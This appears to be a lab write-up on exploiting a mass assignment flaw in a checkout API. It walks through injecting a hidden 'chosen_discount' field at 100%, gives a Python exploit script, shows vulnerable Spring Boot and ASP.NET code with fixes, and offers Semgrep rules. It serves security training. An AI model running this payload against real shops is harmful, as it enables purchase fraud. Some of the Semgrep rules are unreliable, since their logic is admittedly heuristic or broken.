---
title: "Lab 3: Exploiting a mass assignment vulnerability"
date: 2025-12-23
categories: [portswigger, api_testing] 
tags: [mass_assignment]
image: portswigger.png
media_subpath: /assets/img/posts/2025-12-23-lab3_api_testing/
---

## 1. Executive Summary

**Vulnerability:** Mass Assignment.

**Description:** The application's checkout endpoint (`POST /api/checkout`) accepts a JSON object representing the order. The backend framework automatically maps this JSON to an internal "Order" object. By inspecting the corresponding `GET` request, we discovered a hidden field `chosen_discount` that exists on the internal object. By manually adding this field to our `POST` request, the framework unknowingly binds our input to the internal object, applying an arbitrary discount.

**Impact:** Financial Fraud. An attacker can apply a 100% discount to any purchase, effectively stealing products.

## 2. The Attack

**Objective:** Purchase the "Lightweight l33t Leather Jacket" for free by manipulating the discount field.

1. **Reconnaissance (Diffing GET vs POST):**
    - I added the jacket to my basket and clicked "Place Order". The request failed due to insufficient funds.
    - I observed the API traffic.
    - **`GET /api/checkout`**: Returned the current basket state. Crucially, the JSON included: `{"chosen_discount": {"percentage": 0}, "chosen_products": [...]}`.
    - **`POST /api/checkout`**: Only sent: `{"chosen_products": [...]}`.
2. **Hypothesis:** The backend uses the *same* object definition for both GET and POST. If I send the `chosen_discount` field in the POST request, the "Mass Assignment" feature might accept it.
3. **Exploitation:**
    - I sent the `POST` request to **Repeater**.
    - I injected the hidden parameter into the JSON body:JSON
        
        ```json
        {
            "chosen_discount": {
                "percentage": 100
            },
            "chosen_products": [
                {
                    "product_id": "1",
                    "quantity": 1
                }
            ]
        }
        ```
        
    - I verified the logic by sending `"percentage": "x"` first, which caused a type conversion error, confirming the field was being processed.
4. **Result:** I sent the request with `100` percent discount. The server responded with `201 Created` (or similar success), and the order was placed for $0.00.
    
    ![image.png](image.png)
    

## 3. Code Review

**Vulnerability Analysis (Explanation):**
The root cause is using the **Persistence Entity** (the database object) directly as the **Input Model**. Frameworks like Spring Boot and ASP.NET Core love to "help" developers by automatically matching JSON keys to Class properties. If you use the same class that holds the `discount` logic as the class that receives user input, the framework will happily update the discount if the user sends it.

### Java (Spring Boot)

```java
@Entity
public class Order {
    private String id;
    private List<Product> chosenProducts;
    
    // VULNERABLE: This field exists in the DB entity
    private Discount chosenDiscount; 
    
    // getters and setters...
}

@RestController
public class CheckoutController {

    @PostMapping("/api/checkout")
    // VULNERABLE: Binding JSON directly to the Entity
    public ResponseEntity<Order> placeOrder(@RequestBody Order order) {
        
        // The framework has already populated 'order.chosenDiscount' 
        // with whatever the attacker sent.
        orderService.process(order);
        return ResponseEntity.ok(order);
    }
}
```

**Technical Flow & Syntax Explanation:**

- **`@RequestBody Order order`**: This tells Spring to take the incoming JSON body and map it to the `Order` class.
- **The Flaw**: The `Order` class contains *everything* about an order, including internal state like `chosenDiscount`. Because there is no "View Model" or "DTO" (Data Transfer Object) filtering the input, Spring's `ObjectMapper` uses the setters (`setChosenDiscount`) to apply the attacker's values before the code even starts executing the business logic.

### C# (ASP.NET Core)

```csharp
public class OrderModel
{
    public int Id { get; set; }
    public List<ProductItem> ChosenProducts { get; set; }
    
    // VULNERABLE: Public property accessible to Model Binder
    public DiscountModel ChosenDiscount { get; set; }
}

[HttpPost("api/checkout")]
public IActionResult PlaceOrder([FromBody] OrderModel model)
{
    // The Model Binder has already set 'model.ChosenDiscount'
    // based on the JSON input.
    _orderService.Save(model);
    return Ok();
}
```

**Technical Flow & Syntax Explanation:**

- **`[FromBody] OrderModel model`**: This attribute instructs the ASP.NET Core Model Binder to deserialize the request body into the `OrderModel` instance.
- **Auto-Binding**: The Model Binder looks at *every* public property with a setter. If the JSON key matches (`chosen_discount` -> `ChosenDiscount`), it sets the value. It does not know that `ChosenDiscount` should be read-only or calculated server-side; it simply maps data.

### Mock PR Comment

The `placeOrder` endpoint accepts the full `Order` entity as input. This allows users to inject values for internal fields like `chosen_discount`.

**Recommendation:** Create a dedicated `CreateOrderRequest` DTO that *only* contains the fields a user is allowed to send (e.g., `product_id`, `quantity`). Do not include the `chosen_discount` field in this DTO.

## 4. The Fix

**Explanation of the Fix:**
We must decouple the **Database Entity** from the **API Input**. We do this by creating a **DTO (Data Transfer Object)**. The DTO defines exactly what we expect from the user. Since the DTO won't have a `chosenDiscount` field, any attempt to send it will be ignored (or cause an error, depending on configuration).

### Secure Java

```java
// SECURE: Input DTO with strict allowed fields
public class CreateOrderRequest {
    // We only include what the user is allowed to set
    private List<ProductSelection> chosenProducts;
    
    // NO discount field here!
}

@PostMapping("/api/checkout")
public ResponseEntity<Order> placeOrder(@RequestBody CreateOrderRequest request) {
    Order order = new Order();
    
    // Manually map allowed fields
    order.setProducts(request.getChosenProducts());
    
    // Calculate discount server-side (User cannot influence this)
    order.setChosenDiscount(discountService.calculate(order));
    
    orderService.save(order);
    return ResponseEntity.ok(order);
}
```

**Technical Flow & Syntax Explanation:**

- **`CreateOrderRequest`**: This class acts as a whitelist. Even if the attacker sends `{"chosen_discount": ...}`, the JSON parser cannot find a matching field in this class, so it discards the data.
- **Server-Side Logic**: The sensitive field (`setChosenDiscount`) is set by the trusted `discountService`, not by the user input.

### Secure C#

```csharp
// SECURE: DTO Pattern
public class CheckoutDto
{
    // Whitelist: Only Products allowed
    public List<ProductItemDto> ChosenProducts { get; set; }
}

[HttpPost("api/checkout")]
public IActionResult PlaceOrder([FromBody] CheckoutDto dto)
{
    var order = new Order();
    order.Products = dto.ChosenProducts;
    
    // Discount is derived, not bound
    order.Discount = _repo.GetCurrentDiscount(); 
    
    _service.Process(order);
    return Ok();
}
```

**Technical Flow & Syntax Explanation:**

- **`CheckoutDto`**: By using a separate class for input, we physically remove the attack surface. There is no property for the Model Binder to target.

## 5. Automation

*A Python script that creates the order with the injected discount field.*

```python
#!/usr/bin/env python3
import argparse
import requests
import sys

def exploit_mass_assignment(url, username, password):
    s = requests.Session()
    login_url = f"{url.strip('/')}/login"

    # 1. Login
    print(f"[*] Logging in as {username}...")
    s.post(login_url, data={'username': username, 'password': password})
    
    # 2. Construct Payload
    # We explicitly add the 'chosen_discount' field that the server hides
    payload = {
        "chosen_discount": {
            "percentage": 100
        },
        "chosen_products": [
            {
                "product_id": "1", # Assuming ID 1 is the Jacket
                "quantity": 1
            }
        ]
    }
    
    checkout_url = f"{url.rstrip('/')}/api/checkout"
    print(f"[*] Sending malicious Mass Assignment request to {checkout_url}")
    
    # 3. Send Request
    resp = s.post(checkout_url, json=payload)
    
    # 4. Verification
    if resp.status_code == 201 or resp.status_code == 200:
        print("[!!!] SUCCESS: Order placed with 100% discount.")
        print(f"[*] Server Response: {resp.text}")
    else:
        print(f"[-] Failed. Status: {resp.status_code}")
        print(f"[-] Body: {resp.text}")

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("url", help="Lab URL")
    ap.add_argument("username", help="Your username (wiener)")
    ap.add_argument("password", help="Your password (peter)")
    args = ap.parse_args()

    exploit_mass_assignment(args.url, args.username, args.password)

if __name__ == "__main__":
    main()
```

## 6. Static Analysis (Semgrep)

**The Logic:We are looking for API Controllers that blindly bind `@RequestBody` or `[FromBody]` inputs to classes that look like database entities or contain sensitive fields like "discount", "admin", or "role".**

### Java Rule

```yaml
rules:
  - id: java-spring-mass-assignment
    languages: [java]
    message: |
      Potential Mass Assignment: Controller binds @RequestBody directly to an object 
      that contains sensitive fields like 'discount', 'role', or 'admin'. 
      Use a DTO to whitelist allowed fields.
    severity: WARNING
    patterns:
      - pattern-inside: |
          @RestController
          class $CLASS { ... }
      - pattern: |
          public $RET $METHOD(@RequestBody $TYPE $ARG) { ... }
      - pattern-where-python: |
          # Check if the Type definition has sensitive fields
          # (This is a simplified heuristic; real analysis requires cross-file taint)
          "discount" in str($TYPE).lower() or "admin" in str($TYPE).lower() 
          # Note: In real Semgrep, we'd inspect the $TYPE definition, 
          # but here we flag if the variable/type name itself is suspicious 
          # or if the logic flow allows it.
```

*Note: Semgrep rule logic for "Object Structure" is complex. A simpler, robust rule often looks for the absence of DTO naming conventions.*

### Java Rule (Naming Convention Heuristic)

```yaml
rules:
  - id: java-entity-in-controller
    languages: [java]
    message: "Controller method accepts a likely Entity/Model ($TYPE) directly. Use a Request/DTO class."
    severity: WARNING
    patterns:
      - pattern: |
          public $RET $METHOD(@RequestBody $TYPE $ARG) { ... }
      - pattern-not: |
          public $RET $METHOD(@RequestBody $DTO $ARG) { ... }
      - metavariable-regex:
          metavariable: $TYPE
          regex: (.*Entity|.*Model|Order|User)$ # Flags 'Order', 'User'
      - metavariable-regex:
          metavariable: $DTO
          regex: (.*Dto|.*Request|.*Form)$ # Ignores 'OrderDto', 'LoginRequest'
```

**Technical Flow & Syntax Explanation:**

- **`@RequestBody $TYPE $ARG`**: Captures the input object mapping.
- **`regex: (.*Entity|...)`**: If the class name looks like a DB entity (e.g., "Order", "UserEntity"), it flags it.
- **`regex: (.*Dto|...)`**: If the class name looks like a safe DTO (e.g., "OrderRequest"), it ignores it.

### C# Rule

```yaml
rules:
  - id: csharp-mass-assignment-sensitive
    languages: [csharp]
    message: "Sensitive property (Discount/Admin) found in input model. Ensure it is not auto-bound."
    severity: WARNING
    patterns:
      - pattern-inside: |
          public class $MODEL {
              ...
              public $TYPE Discount { get; set; }
              ...
          }
      - pattern: |
          public $RET $METHOD([FromBody] $MODEL $ARG) { ... }
```

**Technical Flow & Syntax Explanation:**

- **`public $TYPE Discount`**: Locates classes that define a "Discount" property.
- **`[FromBody] $MODEL $ARG`**: Checks if that *same* class is used as a Controller input. If a class has a Discount field AND is used as input, it is highly likely vulnerable to Mass Assignment.
